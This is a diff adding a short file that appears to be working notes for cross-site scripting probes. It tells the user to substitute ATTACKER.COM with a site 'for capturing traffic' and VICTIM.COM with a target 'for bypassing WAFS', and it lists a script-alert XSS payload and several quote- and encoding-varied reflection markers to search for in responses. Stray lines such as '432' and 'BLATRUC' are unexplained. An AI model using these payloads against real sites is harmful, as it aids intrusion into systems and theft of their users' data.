@@ -1,0 +1,11 @@
+Replace ATTACKER.COM with your website for capturing traffic and VICTIM.COM with the victim website for bypassing WAFS.
+Search for in response:
+#important
+<ITMIGHTWORKBUTLOOKHERE
+<script>alert("XSS")</script>
+"ITMIGHTWORKBUTLOOKHERE
+'ITMIGHTWORKBUTLOOKHERE
+%45ITMIGHTWORKBUTLOOKHERE
+432
+#just look
+BLATRUC
